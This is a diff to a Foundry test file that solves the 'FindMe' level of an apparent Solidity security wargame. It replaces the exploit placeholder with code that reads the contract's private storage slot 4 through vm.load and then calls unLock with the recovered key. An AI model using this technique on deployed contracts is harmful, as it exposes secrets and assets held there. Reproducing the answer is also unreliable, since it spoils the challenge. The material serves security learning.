@@ -2,7 +2,7 @@
 pragma solidity ^0.8.25;
 
 import "./BaseTest.t.sol";
-import "src/04_FindMe/FindMe.sol";
+import "../src/04_FindMe/FindMe.sol";
 
 // forge test --match-contract FindMeTest -vvvv
 contract FindMeTest is BaseTest {
@@ -19,8 +19,14 @@ contract FindMeTest is BaseTest {
         instance = new FindMe(setImmutable, data);
     }
 
+    function getKey() internal view returns(bytes32 value) {
+        value = vm.load(address(instance), bytes32(uint256(4)));
+    }
+
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        bytes32 value = getKey();
+        assertEq(value, keccak256(abi.encodePacked(tx.origin, "1")));
+        instance.unLock(bytes16(value));
 
         checkSuccess();
     }
